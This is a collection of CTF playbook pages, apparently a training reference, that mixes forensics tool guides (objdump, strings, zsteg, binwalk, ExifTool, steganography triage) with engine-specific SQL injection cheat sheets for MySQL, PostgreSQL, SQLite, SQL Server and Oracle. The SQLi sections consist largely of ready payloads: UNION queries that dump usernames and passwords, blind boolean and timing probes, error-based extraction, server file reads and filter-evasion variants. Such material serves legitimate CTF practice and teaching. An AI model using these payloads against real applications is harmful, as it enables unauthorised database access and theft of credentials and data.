Inspect what the carrier shows Carrier Human inspection Image Full size, alpha/background, crop boundaries, suspicious color regions Animation All frames, frame order and timing QR/barcode Decode original first; retain quiet border when making a crop Audio Duration, left/right difference, repeated pulses, speech/tone clues PDF All pages, annotations, attachments, text on similar-colored backgrounds Text Line lengths, tabs vs spaces, invisible code points, capitalization Inspecting a screenshot cannot recover a hidden bitstream from the original image. Work on the supplied file, not a preview compressed by a chat service.
4. Pick the next branch from evidence Readable metadata hint? → follow that exact hint first Appended/embedded signature? → carve and validate container Lossless image + no structural clue? → inspect channels and LSB JPEG + pixel LSB looks random? → metadata/trailer/coefficient hypothesis Audio + tones/visual hint? → spectrogram PDF + no visible text? → text extraction / objects / attachments Text + unexplained length? → inspect code points and whitespaceNo need to attempt every channel ordering before reading an obvious EXIF comment.
5. Extracted data: classify again xxd -l 64 extracted.bin strings -a -n 6 extracted.bin binwalk extracted.binCommon second layers: ZIP/gzip/xz, Base64/hex, a QR image, text containing a password, or XOR with a clue-derived key. Check alphabet and padding before Base64-decoding a random alphanumeric string. Keep raw bytes; invalid UTF-8 is common in a legitimate binary payload.
6. Controls that stop false positives Finding Verification zsteg says file: Extract exact selector; check file structure and parser result A few printable letters Seek complete grammar, expected prefix or a valid next-layer header Archive found List entries and verify its CRC after bounded extraction “Flag” in metadata Confirm challenge format and whether it is a hint/decoy Altered image reveals text Save the transformation settings and visually confirm every character If you can only infer an ambiguous letter, keep it marked as uncertain until the source/frame or another layer resolves it.
Tools: ExifTool, binwalk, strings, HxD, xxd.
Next: LSB, container parsing, carving.

title: objdump
content:
Use for: headers, sections, imports, symbols and disassembly.
Run in: WSL; supplied by GNU Binutils.
Quick commands objdump -f challenge objdump -h challenge objdump -t challenge objdump -T challenge objdump -p challenge objdump -d -M intel challenge > disassembly.txt objdump -s -j .rodata challenge Option Meaning -f File/architecture headers -h Section headers -t / -T Symbols / dynamic symbols -p Format specific headers, including PE import information -d Disassemble code sections -s -j NAME Dump a selected section Walkthrough: find validation logic objdump -d -M intel --disassemble=main challenge objdump -d -M intel challenge > disassembly.txt grep -n -E 'strcmp|memcmp|scanf|fgets' disassembly.txtRead the surrounding calls, branches and referenced constants. Move into Ghidra or gdb for data flow and runtime values.
Raw x86-64 bytes objdump -D -b binary -m i386:x86-64 -M intel code.binGotchas File offsets and virtual addresses are different. -D can decode data as instructions; plausible assembly is not proof of code. -M intel is relevant to x86 targets. Supported architectures/formats depend on the installed Binutils build; inspect objdump -i. Additional flags explained Flag Meaning -D Disassemble all sections, including sections that may be data -M intel Use Intel syntax for x86 disassembly -j NAME Select a named section --disassemble=NAME Disassemble a particular symbol --start-address=ADDR Begin output at a virtual/section address --stop-address=ADDR Stop at the specified address -b binary Treat input as a raw binary blob -m ARCH Select a machine architecture -i List supported formats and architectures --start-address is not a byte seek into the file. For raw blobs you choose the address model; for ELF/PE input follow its section addressing.
CTF: inspect only a suspect code range # Example addresses from an analysis session; replace them objdump -d -M intel --start-address=0x401100 \ --stop-address=0x401180 challengeRead callers, constants and branch conditions around the comparison. Do not infer the expected input from one instruction without following the data flow.
CTF: inspect read-only data and initialized globals objdump -h challenge objdump -s -j .rodata challenge objdump -s -j .data challengeSection names are not universal; PE often uses .rdata rather than .rodata. Use the names printed by -h.
Convert section addresses to file offsets If a section has VMA 0x402000, file offset 0x2000, and a referenced address is 0x402123, the corresponding file offset is:
file offset = 0x2000 + (0x402123 - 0x402000) = 0x2123Apply this only inside that section’s file-backed range. Zero-initialized storage may have no equivalent input bytes. PIE runtime addresses require subtracting the correct load bias first.
CTF: locate imported Windows APIs objdump -p challenge.exe > pe_headers.txt grep -niE 'DLL Name|GetProcAddress|LoadLibrary|VirtualAlloc' pe_headers.txtImports help choose investigation points. Their presence alone does not establish which execution path uses them.
Recognize common validation patterns Pattern What to trace XOR/add/rotate inside a byte loop Key, iteration count and output compare Call to strcmp/memcmp Both arguments and exact length Length test before a loop Required input bytes, newline handling Table lookup Index width and signedness Several arithmetic checks Constraints shared across input positions Reference: GNU objdump manual.
Related playbooks Binary triage Static analysis

title: 02 · SQLi — MySQL / MariaDB
content:
MySQL / MariaDB SQLi Prerequisite: a confirmed injection, correct closure, column count, and reflected text slot. If not, start with SQLi.
The first payload below assumes a single-quoted input, three columns, and the second column displayed. Queries after it are fragments to adapt into that same UNION slot.
1. Confirm engine and current schema missing' UNION SELECT NULL,CONCAT_WS(':',VERSION(),DATABASE(),CURRENT_USER()),NULL-- -VERSION() distinguishes a MySQL/MariaDB build when its output is visible. DATABASE() can be NULL when no default schema is selected. CURRENT_USER() describes the account used for privilege checks; USER() describes the connection identity.
2. Enumerate schemas and tables SELECT schema_name FROM information_schema.schemata; SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name;One displayed field:
missing' UNION SELECT NULL,GROUP_CONCAT(table_name SEPARATOR ','),NULL FROM information_schema.tables WHERE table_schema=DATABASE()-- -If nothing appears, inspect the active schema and privileges; do not assume a guessed users table exists.
3. Enumerate columns SELECT column_name,data_type FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' ORDER BY ordinal_position;Complete example:
missing' UNION SELECT NULL,GROUP_CONCAT(CONCAT(column_name,':',data_type) ORDER BY ordinal_position SEPARATOR ','),NULL FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'-- -Match both schema and table name. A same-named table in another database can otherwise confuse the output.
4. Read the target SELECT id,username,password FROM users; SELECT flag FROM flags; SELECT username,password FROM users WHERE username='admin';Combine fields / rows in one reflected slot:
missing' UNION SELECT NULL,GROUP_CONCAT(CONCAT_WS(':',id,username,password) SEPARATOR '|'),NULL FROM users-- -CONCAT() returns NULL if an argument is NULL; CONCAT_WS() skips NULL values. Use COALESCE(password,'<NULL>') if distinguishing NULL matters. Long GROUP_CONCAT output may be truncated by server settings or application rendering. Read one ordered row at a time:
SELECT CONCAT_WS(':',id,username,password) FROM users ORDER BY id LIMIT 1 OFFSET 0; SELECT CONCAT_WS(':',id,username,password) FROM users ORDER BY id LIMIT 1 OFFSET 1;5. Boolean extraction expressions Substitute these predicates into your established true/false request:
LENGTH(DATABASE())>5 SUBSTRING(DATABASE(),1,1)='c' ASCII(SUBSTRING(DATABASE(),1,1))>109 EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema=DATABASE() AND table_name='flags') LENGTH((SELECT flag FROM flags ORDER BY id LIMIT 1))>20 ASCII(SUBSTRING((SELECT flag FROM flags ORDER BY id LIMIT 1),1,1))>109LENGTH() measures bytes; CHAR_LENGTH() measures characters. ASCII() is convenient for ASCII flags; use HEX() / ORD() when byte representation matters. A scalar subquery must return at most one row.
6. Conditional delay Numeric-context examples:
1 AND IF(1=1,SLEEP(2),0)=0 1 AND IF(1=2,SLEEP(2),0)=0 1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>109,SLEEP(2),0)=0A delay may execute once per candidate row or be optimized away. Use a narrow baseline query and alternate true/false probes. A single slow response is not proof. See blind SQLi.
7. File read, if privileges permit SELECT LOAD_FILE('/flag.txt'); SELECT HEX(LOAD_FILE('/flag.txt'));This reads on the database server, which might be a separate container. It needs the relevant file privilege, readable file, and compatible secure_file_priv configuration. NULL may mean any precondition failed, not that the file is absent. Enumerating the database is usually the shorter path.
8. Filter-specific alternatives Constraint actually observed Candidate Limit Literal spaces blocked UNION/**/SELECT Comments must reach the SQL parser Quoted string blocked 0x61646d696e MySQL hex literal for admin; coercion matters SUBSTRING blocked MID(value,1,1) Same behavior only if allowed Simple case-sensitive word match UnIoN SeLeCt SQL keyword case, not identifier case Naive SQL comment filter /*!50000SELECT*/ MySQL executable comment, version/context dependent Do not assume || means OR or concatenation: MySQL SQL modes can change its meaning. UPDATEXML / EXTRACTVALUE error payloads are legacy/version-dependent and are not a reliable MySQL 8 route.
Official references: information functions, INFORMATION_SCHEMA, string functions.

title: strings
content:
Use for: quick readable text triage in binaries, images and memory dumps.
Run in: WSL; GNU Binutils.
Quick commands strings -a challenge.bin # Scan the whole artifact strings -a -n 6 challenge.bin # Suppress strings shorter than six strings -a -t x challenge.bin > strings_hex_offsets.txt # Retain byte offsets strings -a -e l challenge.bin > utf16le_strings.txt # Windows-style wide text strings -a -e b challenge.bin > utf16be_strings.txt # Big-endian wide text-a: whole file. -n: minimum length. -t x: hexadecimal offsets. -e l: 16-bit little endian, often useful for Windows text.
Walkthrough: hunt a clue strings -a -t x challenge.bin > strings.txt grep -niE 'flag|password|secret|https?://' strings.txt # Repeat for UTF-16LE strings -a -e l -t x challenge.bin > wide_strings.txt grep -niE 'flag|password|secret' wide_strings.txtUse the reported hex offset to inspect nearby bytes:
# Replace 0x120 with the offset you found xxd -s 0x120 -l 128 challenge.binGotchas No hit does not mean no flag; text may be encrypted, split or compressed. A hit may be a decoy or an unrelated string. Verify its context. grep -n reports the text output line number; strings -t x reports the binary offset. Huge dumps produce huge output files; start with targeted keywords and encoding choices. Flags explained Flag Meaning Why useful in a CTF -a Scan the entire file Includes data outside normally selected sections -n 6 Require at least six printable characters Reduce short accidental fragments -t x Prefix strings with hexadecimal file offsets Jump to the original bytes -t d Use decimal offsets Match tools reporting decimal positions -e l Scan 16-bit little-endian characters Windows wide strings -e b Scan 16-bit big-endian characters Big-endian wide text The accompanying grep -n means output line numbers, -i ignores case, and -E enables extended regex. Those are grep flags, not strings flags.
CTF: inspect nearby messages # Preserve nearby strings so you can see success/failure context strings -a -t x challenge | grep -i -C 4 'correct' strings -a -e l -t x challenge.exe | grep -i -C 4 'password'Here grep’s -C 4 includes four lines of context before/after each match. A nearby string may be unrelated in control flow; follow references in a disassembler to confirm usage.
CTF: find endpoints and paths strings -a artifact.bin > all_strings.txt grep -nE 'https?://|/api/|[A-Za-z]:\\' all_strings.txtLook for resource names, configuration paths, usernames and unusual filenames, not only the flag prefix. Use these as search terms in other artifacts.
CTF: compare two versions strings -a before.bin | sort -u > before_strings.txt strings -a after.bin | sort -u > after_strings.txt diff -u before_strings.txt after_strings.txtsort -u deduplicates and loses original order; keep the offset-preserving files separately. diff -u displays the changed lines with context.
CTF: search extracted memory Scan a selected process dump from Volatility before the entire memory image. That makes attribution clearer. Search both ordinary and UTF-16LE strings, then return to the memory mapping or process context for a useful hit.
Interpret the offset 12a0 Invalid password12a0 is a byte offset inside the scanned file when using -t x. It is not automatically a virtual address or a line number. For ELF/PE files, section mapping is needed to locate the corresponding runtime address.
Reference: GNU strings manual.
Related playbooks Steganography triage Strings and encodings

title: 03 · SQLi — PostgreSQL
content:
PostgreSQL SQLi Flow: version() → database/schema → tables → columns → text-cast data. Start with SQLi if the insertion context is not yet confirmed.
1. Identify engine and context Example input: three-column UNION, second column accepts text.
missing' UNION SELECT NULL,version(),NULL-- - missing' UNION SELECT NULL,current_database()||':'||current_schema()||':'||current_user,NULL-- -PostgreSQL is strict about UNION types. A text expression in an integer slot fails even if the injection itself works. Try each position with NULL elsewhere; cast retrieved values with ::text, but do not expect a cast to repair an incompatible original UNION column type.
2. Enumerate schemas and tables Standalone query fragments:
SELECT schema_name FROM information_schema.schemata ORDER BY schema_name; SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema') ORDER BY table_schema,table_name;Complete single-slot payload:
missing' UNION SELECT NULL,string_agg(table_schema||'.'||table_name,','),NULL FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')-- -The app’s tables need not be in public. Qualify names with the discovered schema.
3. Enumerate columns SELECT column_name,data_type FROM information_schema.columns WHERE table_schema='public' AND table_name='users' ORDER BY ordinal_position;missing' UNION SELECT NULL,string_agg(column_name||':'||data_type,',' ORDER BY ordinal_position),NULL FROM information_schema.columns WHERE table_schema='public' AND table_name='users'-- -4. Read rows SELECT id,username,password FROM public.users ORDER BY id; SELECT flag FROM public.flags; SELECT concat_ws(':',id::text,username,password) FROM public.users ORDER BY id LIMIT 1 OFFSET 0;missing' UNION SELECT NULL,string_agg(concat_ws(':',id::text,username,password),'|'),NULL FROM public.users-- -|| concatenates strings but a NULL operand yields NULL. Use COALESCE(value,'<NULL>') when needed. Names created with quoted mixed case require exact double quotes: public."SecretFlags".
5. Blind predicates length(current_database())>5 substring(current_database(),1,1)='c' ascii(substring(current_database(),1,1))>109 EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema='public' AND table_name='flags') ascii(substring((SELECT flag FROM public.flags ORDER BY id LIMIT 1),1,1))>109For byte-level work, encode(convert_to(value,'UTF8'),'hex') yields text hex. length(text) counts characters.
6. Conditional delay pg_sleep() returns void; do not copy MySQL’s AND SLEEP(...) directly.
These numeric-context probes make a scalar subquery that returns integer 1:
1 AND (SELECT 1 FROM pg_sleep(CASE WHEN 1=1 THEN 2 ELSE 0 END))=1 1 AND (SELECT 1 FROM pg_sleep(CASE WHEN 1=2 THEN 2 ELSE 0 END))=1 1 AND (SELECT 1 FROM pg_sleep(CASE WHEN ascii(substring(current_database(),1,1))>109 THEN 2 ELSE 0 END))=1If stacked statements are accepted by the driver:
1'; SELECT pg_sleep(2)-- -A blocked second statement does not rule out SQLi. Use the scalar form or a boolean oracle instead.
7. Detailed error oracle Where database exception details are exposed, forcing text into an integer may reveal the text:
1 AND CAST((SELECT current_database()) AS integer)=1The error can include invalid input syntax for type integer: "...". If the value is valid numeric text, conversion succeeds; prefix a marker in a suitable subquery if needed. A generic error page provides only an error/no-error signal.
8. File read is privileged SELECT pg_read_file('/flag.txt',0,4096);Availability depends on the function grants, server-file roles, superuser status, and path restrictions. This is a server-side file, not necessarily the web container’s file. Prefer catalog/data reads before assuming server file access.
Official references: system information, information schema, string functions, server file functions.

title: zsteg
content:
Use for: bit plane and LSB steganography in PNG/BMP images.
Run in: WSL; Ruby gem already supplied.
Quick commands zsteg --help # Discover supported options zsteg image.png # Run normal image stego checks zsteg -a image.png > zsteg_results.txt # Search all supported combinationsWalkthrough: extract a detected channel Run zsteg image.png. Look for coherent text or a recognizable file signature. Copy the exact channel selector from that result. Extract it with -E and inspect the saved bytes. # Example selector; replace it with the result from YOUR image zsteg -E 'b1,rgb,lsb,xy' image.png > extracted.bin xxd -l 64 extracted.bin strings -a extracted.binRead the selector b1,rgb,lsb,xy │ │ │ └─ pixel traversal order │ │ └───── least significant bit interpretation │ └───────── selected color channels └──────────── one bit per selected channelGotchas -a is a broad search; false positives are common. JPEG is not this tool’s normal target format. Resizing or re-saving an image can destroy hidden bits; analyze the original. An extracted stream may need another decode/decompression step. CTF: narrow the search after the first scan # Save broad results once rather than repeatedly scanning zsteg -a image.png > scan.txt 2>&1 grep -niE 'flag|text:|file:' scan.txt # Inspect only a specific bit count/channel combination zsteg --bits 1 --channels r image.png zsteg --bits 1 --channels rgb image.pngUse zsteg --help to confirm the installed selector switches. A channel finding should lead to extraction and verification.
Flags explained Flag Meaning -a / --all Try all known supported methods -E NAME Extract exactly the named payload selector --bits N Select the bit count/pattern to examine --channels LIST Choose channels and their order, such as r or bgr --order xy Choose pixel traversal order --lsb / --msb Select bit interpretation order --limit N Limit checked bytes; zero disables that limit Read the extracted selector literally. b1,rgb,lsb,xy combines choices that correspond to separate options; changing any component changes the recovered byte stream.
CTF: follow a compressed payload # Example detected selector: copy the exact value from your own result zsteg -E 'b1,rgb,lsb,xy' image.png > payload.bin xxd -l 32 payload.bin binwalk payload.bin strings -a payload.bin | head -n 30If the extraction starts with gzip magic 1f 8b, decompress with Python:
from pathlib import Path import gzip raw = Path("payload.bin").read_bytes() plain = gzip.decompress(raw) Path("payload_decoded.bin").write_bytes(plain) print(repr(plain[:200]))Trailing carrier bits may follow the real payload. Use its format/length/checksum to identify the meaningful bytes before deciding extraction failed.
Understand alternate pixel orders xy versus yx changes traversal order. Channel orders such as rgb and bgr change how bits are joined. lsb/msb affects interpretation. Several plausible looking outputs can come from one image; trust a complete message or valid file structure.
Inspect one channel independently with Python If Pillow is installed as an allowed non-AI Python library, this example reads one low bit from each red-channel pixel, row by row, packing the first collected bit as the most significant bit of each output byte:
from PIL import Image from pathlib import Path image = Image.open("image.png").convert("RGB") bits = [r & 1 for r, g, b in image.getdata()] packed = bytes( sum(bits[start + bit] << (7 - bit) for bit in range(8)) for start in range(0, len(bits) - 7, 8) ) Path("red_lsb.bin").write_bytes(packed) print(repr(packed[:100]))This is one explicit layout, not a decoder for every stego scheme. Palette indices, alpha channels and custom traversal require different handling.
Decide the next tool Result Next step Readable flag-shaped text Validate full value and prefix Encoded text CyberChef / Python decode File signature Save bytes; validate with the format’s parser Many short English fragments Treat as possible noise No meaningful LSB result Check metadata, appended data, visible channels and challenge hints Reference: zsteg usage and extraction examples.
Related playbooks Explicit image LSB extraction Image container analysis

title: 04 · SQLi — SQLite
content:
SQLite SQLi Flow: sqlite_version() → sqlite_schema → CREATE TABLE SQL → actual columns → target rows.
SQLite is common in small Python/PHP CTF apps. Framework language alone is not proof of SQLite. First establish the injection context.
1. Identify engine Three-column UNION with second column displayed:
missing' UNION SELECT NULL,sqlite_version(),NULL-- -No DATABASE() / @@VERSION / information_schema in ordinary SQLite. Its schema catalog is sqlite_schema; the older name sqlite_master remains widely usable.
2. Read the schema Standalone fragments:
SELECT name,type,sql FROM sqlite_schema ORDER BY type,name; SELECT name FROM sqlite_master WHERE type='table'; SELECT sql FROM sqlite_master WHERE type='table' AND name='users';Complete payloads:
missing' UNION SELECT NULL,group_concat(name,','),NULL FROM sqlite_master WHERE type='table'-- - missing' UNION SELECT NULL,group_concat(sql,char(10)),NULL FROM sqlite_master WHERE type='table'-- -The sql field often gives the whole CREATE TABLE, including target column names and hidden flags such as is_secret. Do not stop after listing table names.
3. Read column metadata if needed PRAGMA table_info('users'); SELECT name,type FROM pragma_table_info('users');PRAGMA is a separate statement and cannot be pasted as a UNION SELECT expression. The table-valued PRAGMA form works on SQLite versions that support it:
missing' UNION SELECT NULL,group_concat(name||':'||type,','),NULL FROM pragma_table_info('users')-- -If unavailable, read the CREATE TABLE SQL instead.
4. Read actual data SELECT username,password FROM users; SELECT flag FROM flags; SELECT title,body FROM notes WHERE is_secret=1;missing' UNION SELECT NULL,group_concat(username||':'||coalesce(password,'<NULL>'),'|'),NULL FROM users-- -SQLite || concatenates strings. + normally performs numeric addition, so do not use it to join flag text. group_concat ignores NULL inputs. For stable pagination, use an actual unique column from the schema:
SELECT flag FROM flags ORDER BY id LIMIT 1 OFFSET 0; SELECT flag FROM flags ORDER BY id LIMIT 1 OFFSET 1;5. Blind predicates length(sqlite_version())>5 EXISTS(SELECT 1 FROM sqlite_master WHERE type='table' AND name='flags') length((SELECT flag FROM flags ORDER BY id LIMIT 1))>20 substr((SELECT flag FROM flags ORDER BY id LIMIT 1),1,1)='f' unicode(substr((SELECT flag FROM flags ORDER BY id LIMIT 1),1,1))>109substr is 1-indexed. unicode returns the first character’s code point. For binary or unexpected text, inspect hex(flag) instead. If the subquery returns no rows, NULL comparisons are not true; first confirm existence.
6. Error/no-error oracle SQLite commonly yields NULL for division by zero. This is not a reliable error payload:
SELECT 1/0;A built-in error candidate on common builds:
1 AND CASE WHEN 1=1 THEN abs(-9223372036854775808) ELSE 1 END=1 1 AND CASE WHEN 1=2 THEN abs(-9223372036854775808) ELSE 1 END=1Taking the absolute value of the minimum signed 64-bit integer raises integer overflow. Confirm the pair on the actual engine; the application’s exception handler must expose a stable difference. See blind SQLi.
7. SQLite limits that save time There is no standard built-in sleep() function. Avoid copying MySQL timing payloads. readfile() / writefile() are usually shell/extension helpers, not standard web connection functions. Python sqlite3.execute() accepts one statement; executescript() has different behavior. Attaching a database or loading an extension is configuration/privilege dependent and unnecessary for a normal flag-row read. File-backed databases are often mounted beside source. A separate LFI might reveal the DB file even when SQLi is absent. Official references: schema table, core functions, PRAGMA, aggregates.

title: binwalk
content:
Use for: embedded file signatures, firmware and appended data.
Run in: WSL. The approved list says latest; CLI details differ between v2 and v3.
Quick commands binwalk --help # Check this version's switches binwalk firmware.bin # Locate embedded file signatures binwalk -e firmware.bin # Extract recognized embedded content binwalk -Me firmware.bin # Recursively extract nested contentCheck the installed help for extraction options. The current upstream tool is a Rust rewrite; older online examples may target Python based v2.
Walkthrough: inspect an embedded file Scan the original file. Record the offset and identified signature. Try extraction and note the output directory printed by the tool. Inspect extracted files; a signature hit alone can be accidental. # Example: carve from decimal offset 4096 to EOF # Replace 4096 with a confirmed offset from the scan dd if=firmware.bin of=carved.bin bs=1 skip=4096 status=none xxd -l 64 carved.binIf the embedded object has a known length, add count=LENGTH to dd.
Gotchas Extraction may require external extractors that are absent on the PC. Recursive extraction can produce large output; start with a normal scan. High entropy suggests compression or encryption but does not distinguish them. Keep the source untouched and write recovered files separately. Flags explained Flag Meaning --help Show supported options for the installed version -e Extract supported embedded content -M Enable recursive/matryoshka analysis/extraction -Me Combine recursive mode and extraction -E on builds supporting it Entropy analysis; confirm in local help Without extraction switches, binwalk FILE scans for signatures. Extraction helpers, destination switches and recursion behavior differ by version. -d is not a universal “decode” flag across tools; use this build’s documented option for the intended task.
Read the scan correctly DECIMAL HEXADECIMAL DESCRIPTION 4096 0x1000 ...embedded format...The decimal and hex values describe the same offset. Record the input filename too: an offset inside an extracted child belongs to that child, not the original container.
CTF: carve an exact range from pathlib import Path # Replace with a validated start and length start, length = 0x1000, 0x2000 data = Path("container.bin").read_bytes() assert 0 <= start <= start + length <= len(data) Path("out/embedded.bin").write_bytes(data[start:start + length])Create out/ first. An adjacent signature is a clue to an end boundary, not proof that two objects are contiguous or independent.
CTF: analyze a misleading image extension xxd -l 32 image.jpg: check the actual header. exiftool image.jpg: compare detected type and metadata. binwalk image.jpg: identify candidate embedded streams. Carve or extract the strongest candidate. Open the extracted object with its parser and look for a complete structure. Record source offset, length and child hash. Entropy as a secondary clue Some builds expose an entropy mode, often -E; confirm it in --help before using it. A compressed archive, encrypted block and ordinary media payload can all have high entropy. An entropy change helps choose where to inspect bytes; it does not identify the algorithm.
Extraction failed: classify the reason Output/problem Meaning / next action Signature found, extractor missing Carve and use an available approved parser Extracted file is truncated Revisit the boundary and source capture/image Repeated nested results Compare sizes/hashes; check recursion growth Random signature inside compressed bytes Validate before spending more time Tool syntax rejected v2/v3 option mismatch; read installed help Keep a small extraction manifest source: challenge.png sha256: <source hash> offset: 4096 / 0x1000 length: <validated length or "to EOF"> candidate format: <scan result> output: out/payload.bin validation: <parser result / checksum / recovered content>This makes nested firmware/archive challenges reproducible and avoids confusing offsets from different layers.
Reference: official Binwalk project.
Related playbooks Archive carving Steganography triage

title: 05 · SQLi — SQL Server
content:
Microsoft SQL Server SQLi Flow: confirm T-SQL → identify database/schema → read sys catalogs → extract rows. First establish the insertion context.
1. Fingerprint Three-column UNION, second column text-compatible:
missing' UNION SELECT NULL,@@VERSION,NULL-- - missing' UNION SELECT NULL,DB_NAME()+':'+SYSTEM_USER,NULL-- -@@VERSION also exists in MySQL; inspect the actual returned product string. Errors mentioning Unclosed quotation mark, SQL Server, or Conversion failed support the fingerprint but are not all unique.
Useful fragments:
SELECT DB_NAME(),SCHEMA_NAME(),SYSTEM_USER,USER_NAME(); SELECT name FROM sys.databases;Metadata visibility follows permissions. A database list can be incomplete.
2. Enumerate tables and columns SELECT s.name,t.name FROM sys.tables AS t JOIN sys.schemas AS s ON s.schema_id=t.schema_id ORDER BY s.name,t.name; SELECT c.name,TYPE_NAME(c.user_type_id) FROM sys.columns AS c WHERE c.object_id=OBJECT_ID('dbo.users') ORDER BY c.column_id;Portable information schema alternative:
SELECT TABLE_SCHEMA,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES; SELECT COLUMN_NAME,DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='dbo' AND TABLE_NAME='users';For SQL Server 2017+:
missing' UNION SELECT NULL,STRING_AGG(CAST(s.name+'.'+t.name AS nvarchar(max)),','),NULL FROM sys.tables t JOIN sys.schemas s ON s.schema_id=t.schema_id-- -If STRING_AGG is unavailable, request individual rows or use a version-appropriate XML concatenation expression. Do not mistake an unknown aggregation function for a failed injection.
3. Read rows and handle types SELECT id,username,password FROM dbo.users ORDER BY id; SELECT flag FROM dbo.flags; SELECT CONCAT(CAST(id AS varchar(20)),':',username,':',password) FROM dbo.users;Complete example:
missing' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM dbo.users-- -+ concatenates strings, but data type precedence can force numeric conversion. Explicit casts avoid that surprise. Use varchar(max) / nvarchar(max) for long values. CONCAT treats NULL values as empty strings; use COALESCE if NULL must be visible.
Read one row on SQL Server 2012+:
SELECT flag FROM dbo.flags ORDER BY id OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;Older route for the first row:
SELECT TOP 1 flag FROM dbo.flags ORDER BY id;4. Boolean predicates LEN(DB_NAME())>5 ASCII(SUBSTRING(DB_NAME(),1,1))>109 EXISTS(SELECT 1 FROM sys.tables WHERE name='flags') ASCII(SUBSTRING((SELECT TOP 1 flag FROM dbo.flags ORDER BY id),1,1))>109LEN() excludes trailing spaces. For Unicode use UNICODE(SUBSTRING(...)); for bytes use a suitable binary cast and DATALENGTH().
5. Conditional delay WAITFOR is a statement, not a scalar function. These need a batch / stacked-statement path permitted by the driver:
1'; IF (1=1) WAITFOR DELAY '00:00:02'-- - 1'; IF (1=2) WAITFOR DELAY '00:00:02'-- - 1'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))>109) WAITFOR DELAY '00:00:02'-- -If multi-statement requests are rejected, prefer boolean or detailed conversion-error extraction. SQL Server SLEEP() is not the right primitive.
6. Error-based extraction If database error text is returned to the client:
1 AND CONVERT(int,DB_NAME())=1 1 AND CONVERT(int,(SELECT TOP 1 flag FROM dbo.flags ORDER BY id))=1A conversion error may include the offending value. Numeric-looking text may convert successfully. A generic 500 gives at most a boolean error signal. Check the actual exception body before assuming data was disclosed.
Avoid blind alleys xp_cmdshell is normally disabled and requires strong privileges. SQLi does not imply OS execution. The SQL Server host may be separate from the web application. Square brackets quote identifiers: [odd table]. Single quotes quote text: 'admin'. dbo is common, not guaranteed; enumerate schemas. A cast in the injected column cannot force the original UNION column to accept a different type. Official references: system catalog views, STRING_AGG, WAITFOR.

title: ExifTool
content:
Use for: image/document metadata, GPS coordinates, comments and thumbnails.
Run in: WSL.
Quick commands exiftool image.jpg # Standard metadata overview exiftool -a -u -g1 image.jpg # Include duplicates, unknowns and groups exiftool -s -FileType -MIMEType image.jpg # Compare detected type with extension exiftool -GPSLatitude -GPSLongitude -n image.jpg # Numeric location clues exiftool -Comment -Artist -Author -Description image.jpg # Creator and hidden notes exiftool -json image.jpg > metadata.json # Save machine-readable metadata-a: duplicate tags. -u: unknown tags. -g1: group names. -n: numeric values without print conversion.
Walkthrough: investigate a photo Dump all metadata with -a -u -g1. Check location, creator, software, timestamps and comments. Compare metadata with visible clues. Extract a thumbnail if the tag exists. exiftool -b -ThumbnailImage image.jpg > thumbnail.jpg exiftool -b -PreviewImage image.jpg > preview.jpgAn absent thumbnail/preview tag can produce an empty output file.
Batch inspection exiftool -r -ext jpg -ext png -csv photos/ > photos_metadata.csvGotchas Metadata can be edited; treat it as a clue to corroborate. A leading minus option reads a tag; -TAG=value writes metadata. GPS reference tags matter when interpreting latitude/longitude manually. Check timezone information before correlating timestamps. Flags explained Flag Meaning -a Show duplicate tags instead of suppressing them -u Include unknown tags that can be extracted -g1 Group by metadata location/family 1 -s Print short tag names -n Print underlying numeric values without normal display conversion -b Emit raw/binary tag contents -json Output JSON for scripting -csv Output a CSV table -r Recurse into subdirectories -ext jpg Restrict processing to a filename extension; repeat for more -Comment reads that tag. -Comment=VALUE writes it. This difference matters when preserving an artifact.
CTF: collect time clues with tag groups # time:all requests tags in the time group; -a keeps duplicates exiftool -a -G1 -s -time:all photo.jpg # Group all metadata while keeping the original tag names exiftool -a -u -G1 -s challenge.pdf > grouped_metadata.txtFilesystem dates, EXIF capture dates and application edit dates are different observations. A missing timezone means you cannot directly assume UTC.
CTF: inspect GPS without losing hemisphere information exiftool -GPSLatitude -GPSLatitudeRef -GPSLongitude -GPSLongitudeRef photo.jpg exiftool -GPSLatitude -GPSLongitude -n photo.jpgCorroborate coordinates with visible landmarks, challenge context or another supplied artifact. Metadata can be deliberately misleading.
CTF: inspect embedded text and alternate metadata exiftool -a -u -G1 image.png | grep -iE 'comment|description|author|software|warning' exiftool -XMP:all -IPTC:all image.jpgPNG textual chunks and XMP fields can contain clues absent from standard EXIF summaries. A warning can reveal a malformed structure worth inspecting with HxD/xxd.
CTF: correlate a directory of photos exiftool -r -ext jpg -csv -FileName -DateTimeOriginal \ -GPSLatitude -GPSLongitude -n photos/ > locations.csvUse filenames plus timestamps to reconstruct a plausible sequence. A missing coordinate or date is not zero; keep missing values explicit in later processing.
Avoid accidental binary corruption Use -b output with binary-preserving shell redirection in WSL. Do not paste thumbnail bytes through a text editor. Check that the output file is nonempty and starts with the expected signature before continuing.
Reference: ExifTool command documentation and official site.
Related playbooks Metadata and carrier triage PNG/JPEG containers

title: 06 · SQLi — Oracle
content:
Oracle SQLi Flow: Oracle error / function → UNION with dual → current-user tables → column types → data.
Start with the general SQLi workflow. Oracle-specific syntax is useful only after matching the original quote/parenthesis context.
1. Fingerprint and count columns Traditional Oracle SELECT probes use dual. This remains useful across versions even where newer releases permit some SELECTs without it.
missing' UNION SELECT NULL FROM dual-- - missing' UNION SELECT NULL,NULL FROM dual-- - missing' UNION SELECT NULL,NULL,NULL FROM dual-- -Find a text-compatible reflected position, then:
missing' UNION SELECT NULL,USER,NULL FROM dual-- - missing' UNION SELECT NULL,banner,NULL FROM v$version-- -Access to v$version can vary. A permission error on that view does not disprove Oracle. Errors beginning ORA- are useful corroboration.
2. Enumerate accessible tables Standalone queries:
